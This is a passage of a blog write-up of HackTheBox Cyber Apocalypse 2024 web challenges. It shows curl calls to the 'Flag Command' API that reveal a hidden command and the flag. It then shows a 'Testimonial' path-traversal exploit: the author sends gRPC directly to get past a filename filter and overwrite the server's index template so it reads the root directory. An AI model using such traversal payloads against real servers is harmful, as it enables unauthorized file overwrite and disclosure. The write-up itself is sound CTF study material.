+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">currentCommand</span> <span class="o">==</span> <span class="s1">&#39;HEAD NORTH&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">currentStep</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">currentCommand</span> <span class="o">==</span> <span class="s1">&#39;FOLLOW A MYSTERIOUS PATH&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">currentStep</span> <span class="o">=</span> <span class="s1">&#39;3&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">currentCommand</span> <span class="o">==</span> <span class="s1">&#39;SET UP CAMP&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">currentStep</span> <span class="o">=</span> <span class="s1">&#39;4&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">lineBreak</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;br&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Unfortunately, reaching step4 does not give us the flag, and we might find that none of the answers allow us to progress. If we look in the bottom of <code>main.js</code>, we have info on how the program is pulling options:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fetchOptions</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/options&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">availableOptions</span> <span class="o">=</span> <span class="nx">res</span><span class="p">.</span><span class="nx">allPossibleCommands</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="k">catch</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">availableOptions</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can curl it, and it displays every command option including a &lsquo;secret&rsquo;:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl http://83.136.254.167:36204/api/options -H &#34;Content-Type: application/json&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;allPossibleCommands&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;1&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;HEAD NORTH&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;HEAD WEST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;HEAD EAST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;HEAD SOUTH&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;2&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;GO DEEPER INTO THE FOREST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;FOLLOW A MYSTERIOUS PATH&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;CLIMB A TREE&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;TURN BACK&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;3&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;EXPLORE A CAVE&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;CROSS A RICKETY BRIDGE&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;FOLLOW A GLOWING BUTTERFLY&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;SET UP CAMP&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;4&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;ENTER A MAGICAL PORTAL&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;SWIM ACROSS A MYSTERIOUS LAKE&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;FOLLOW A SINGING SQUIRREL&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;BUILD A RAFT AND SAIL DOWNSTREAM&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;secret&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Submitting the secret returns the password:
+<img src="/p/hackthebox-cyber-apocalypse-2024/images/flagcommand_flag.png"
+	width="943"
+	height="229"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/flagcommand_flag_hu1712195375273947472.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/flagcommand_flag_hu1606552945598060055.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="411"
+		data-flex-basis="988px"
+	
+>
+We can do this in command line as well, directly submitting to /api/monitor:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ curl http://83.136.254.167:36204/api/monitor -H &#34;Content-Type: application/json&#34; -d &#39;{&#34;command&#34;:&#34;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack&#34;}&#39;
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  &#34;message&#34;: &#34;HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!}&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I suppose it is all for the challenge, but it felt weird to have a <code>command.js</code> file that only contains the first set of commands, then retrieving the rest from an off-source location..</p>
+<h3 id="testimonial">Testimonial
+</h3><p>Difficulty: Easy</p>
+<blockquote>
+<p>As the leader of the Revivalists you are determined to take down the KORP, you and the best of your faction&rsquo;s hackers have set out to deface the official KORP website to send them a message that the revolution is closing in.</p>
+</blockquote>
+<hr>
+<p>The web server is written in <code>Go</code>, and has a ton of separate files:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ tree
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">├── client
+</span></span><span class="line"><span class="cl">│   └── client.go
+</span></span><span class="line"><span class="cl">├── go.mod
+</span></span><span class="line"><span class="cl">├── go.sum
+</span></span><span class="line"><span class="cl">├── grpc.go
+</span></span><span class="line"><span class="cl">├── handler
+</span></span><span class="line"><span class="cl">│   ├── home.go
+</span></span><span class="line"><span class="cl">│   └── shared.go
+</span></span><span class="line"><span class="cl">├── main.go
+</span></span><span class="line"><span class="cl">├── Makefile
+</span></span><span class="line"><span class="cl">├── pb
+</span></span><span class="line"><span class="cl">│   ├── ptypes_grpc.pb.go
+</span></span><span class="line"><span class="cl">│   ├── ptypes.pb.go
+</span></span><span class="line"><span class="cl">│   └── ptypes.proto
+</span></span><span class="line"><span class="cl">├── public
+</span></span><span class="line"><span class="cl">│   ├── css
+</span></span><span class="line"><span class="cl">│   │   ├── bootstrap.min.css
+</span></span><span class="line"><span class="cl">│   │   └── main.css
+</span></span><span class="line"><span class="cl">│   ├── js
+</span></span><span class="line"><span class="cl">│   │   └── bootstrap.min.js
+</span></span><span class="line"><span class="cl">│   └── testimonials
+</span></span><span class="line"><span class="cl">│       ├── 1.txt
+</span></span><span class="line"><span class="cl">│       ├── 2.txt
+</span></span><span class="line"><span class="cl">│       └── 3.txt
+</span></span><span class="line"><span class="cl">├── tmp
+</span></span><span class="line"><span class="cl">│   └── build-errors.log
+</span></span><span class="line"><span class="cl">└── view
+</span></span><span class="line"><span class="cl">    ├── home
+</span></span><span class="line"><span class="cl">    │   └── index.templ
+</span></span><span class="line"><span class="cl">    └── layout
+</span></span><span class="line"><span class="cl">        └── app.templ
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">11 directories, 20 files
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In essence, this web server has two main components: the front-end index page, and a back-end gRPC client. We can submit testimonies on the main page:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/submittestimony.png"
+	width="1417"
+	height="580"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/submittestimony_hu4523358356122597774.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/submittestimony_hu4299662273397857925.png 1024w"
+	loading="lazy"
+	
+		alt="1, submit asdf testimony. 2, my testimony appears above."
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="586px"
+	
+></p>
+<p>When we submit, our name passes through an interesting filter:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">Client</span><span class="p">)</span> <span class="nf">SendTestimonial</span><span class="p">(</span><span class="nx">customer</span><span class="p">,</span> <span class="nx">testimonial</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Filter bad characters.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">char</span> <span class="o">:=</span> <span class="k">range</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="s">&#34;\\&#34;</span><span class="p">,</span> <span class="s">&#34;:&#34;</span><span class="p">,</span> <span class="s">&#34;*&#34;</span><span class="p">,</span> <span class="s">&#34;?&#34;</span><span class="p">,</span> <span class="s">&#34;\&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;&lt;&#34;</span><span class="p">,</span> <span class="s">&#34;&gt;&#34;</span><span class="p">,</span> <span class="s">&#34;|&#34;</span><span class="p">,</span> <span class="s">&#34;.&#34;</span><span class="p">}</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">customer</span> <span class="p">=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">ReplaceAll</span><span class="p">(</span><span class="nx">customer</span><span class="p">,</span> <span class="nx">char</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">SubmitTestimonial</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">pb</span><span class="p">.</span><span class="nx">TestimonialSubmission</span><span class="p">{</span><span class="nx">Customer</span><span class="p">:</span> <span class="nx">customer</span><span class="p">,</span> <span class="nx">Testimonial</span><span class="p">:</span> <span class="nx">testimonial</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">err</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The filter here is submitting our testimony to the gRPC client. There is an easy way to bypass this filter, however, and that is to submit the gRPC requests ourselves! When we launch the instance, we are given two IP:PORT combinations. The first being for the web front-end, and the second is for the gRPC service.</p>
+<p>When we look at <code>grpc.go</code>, we can see what the testimony submissions are doing:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">server</span><span class="p">)</span> <span class="nf">SubmitTestimonial</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">req</span> <span class="o">*</span><span class="nx">pb</span><span class="p">.</span><span class="nx">TestimonialSubmission</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="nx">pb</span><span class="p">.</span><span class="nx">GenericReply</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Customer</span> <span class="o">==</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="s">&#34;Name is required&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Testimonial</span> <span class="o">==</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="s">&#34;Content is required&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">WriteFile</span><span class="p">(</span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;public/testimonials/%s&#34;</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Customer</span><span class="p">),</span> <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">Testimonial</span><span class="p">),</span> <span class="mo">0644</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">&amp;</span><span class="nx">pb</span><span class="p">.</span><span class="nx">GenericReply</span><span class="p">{</span><span class="nx">Message</span><span class="p">:</span> <span class="s">&#34;Testimonial submitted successfully&#34;</span><span class="p">},</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It is using our submitted name (Customer parameter) as the file to write! Since we can control this, we can escape the directory and perform directory traversal. This is why the previous bad character list was in place, but as mentioned we can bypass this by submitting to gRPC ourselves. For this, I used <a class="link" href="https://www.postman.com/"  target="_blank" rel="noopener"
+    >Postman</a>, although clever people might be able to get it working with <a class="link" href="https://github.com/nathangoulding/grpcli"  target="_blank" rel="noopener"
+    >grpcli</a> or something else.</p>
+<p>For Postman, we can specify gRPC requests:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/postman1.png"
+	width="855"
+	height="345"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/postman1_hu12935593177206199197.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/postman1_hu8771693216854692302.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="594px"
+	
+></p>
+<p>We select our URL, and since this gRPC client doesn&rsquo;t have server reflection, we must upload the <code>ptypes.proto</code> from the challenge zip:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/postmanimport.png"
+	width="870"
+	height="337"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/postmanimport_hu928644672467533550.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/postmanimport_hu10848302855054086591.png 1024w"
+	loading="lazy"
+	
+		alt="Selecting Import a .proto, go to the ptypes.proto location"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="258"
+		data-flex-basis="619px"
+	
+></p>
+<p><code>SubmitTestimonial</code> is the only protocol that exists, so this is an easy choice. Example message can quickly generate the proper format for us:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/postman2.png"
+	width="891"
+	height="398"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/postman2_hu952111936296372586.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/postman2_hu647917406557712168.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="223"
+		data-flex-basis="537px"
+	
+></p>
+<p>Then you can submit a response, and get an error about http in your address.. I even had the wrong IP:PORT. But when it&rsquo;s fixed, you get a successfully submitted:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/postman3.png"
+	width="752"
+	height="527"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/postman3_hu10641979175461552253.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/postman3_hu14528396150328018657.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="142"
+		data-flex-basis="342px"
+	
+></p>
+<p>Now lorem ipsum appears:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/loremipsum.png"
+	width="676"
+	height="346"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/loremipsum_hu9733309813372928646.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/loremipsum_hu8550999345793081272.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="195"
+		data-flex-basis="468px"
+	
+></p>
+<p>We can also view the testimonials directory ourselves, but it is interesting as no matter what we try, we cannot write or overwrite the files in this location:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/testimonials.png"
+	width="568"
+	height="130"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/testimonials_hu4141500079707753752.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/testimonials_hu666255181550677025.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="436"
+		data-flex-basis="1048px"
+	
+></p>
+<p>What&rsquo;s even more interesting, is we can submit a new 1.txt to overwrite, and the main page will overwrite the content. However, if we visit the <code>1.txt</code> in this location, the content does not change. My guess is that this is the nature of a go-generated web server. These directories are created at launch, and are now static?</p>
+<p>Through trial and error, we might find that we can overwrite the index template located at <code>challenge/view/home/index.templ</code>. This is where the front-end page is being called, and writing over it completely bricks the web service. Thus, I have an idea: what if we edit this template directly, and have it pull submissions from the root directory instead of public/testimonials? Genius, I say. It took a lot of effort to format the page in a way that Postman would accept, but I eventually get it:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/postman4.png"
+	width="852"
+	height="300"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/postman4_hu18061546924661145722.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/postman4_hu3851789452786619122.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="284"
+		data-flex-basis="681px"
+	
+></p>
+<p>Alterations that needed to be done:</p>
+<ul>
+<li>Replace hard returns with <code>\n</code> for newline.</li>
+<li>Escape all double quotes, and no, replacing to single quotes does not work.</li>
+<li>Remove all tab indentations
+The edit to the index code was done here:</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">GetTestimonials</span><span class="p">()</span> <span class="p">[]</span><span class="kt">string</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">fsys</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">DirFS</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">files</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">fs</span><span class="p">.</span><span class="nf">ReadDir</span><span class="p">(</span><span class="nx">fsys</span><span class="p">,</span> <span class="s">&#34;.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;Error reading testimonials: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">res</span> <span class="p">[]</span><span class="kt">string</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">file</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">files</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">fileContent</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">fs</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="nx">fsys</span><span class="p">,</span> <span class="nx">file</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">res</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">res</span><span class="p">,</span> <span class="nb">string</span><span class="p">(</span><span class="nx">fileContent</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">res</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>What was once <code>os.DirFS(&quot;public/testimonials&quot;)</code>  is now this.
+Full request:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nt">&#34;customer&#34;</span><span class="p">:</span> <span class="s2">&#34;../../../../../challenge/view/home/index.templ&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">
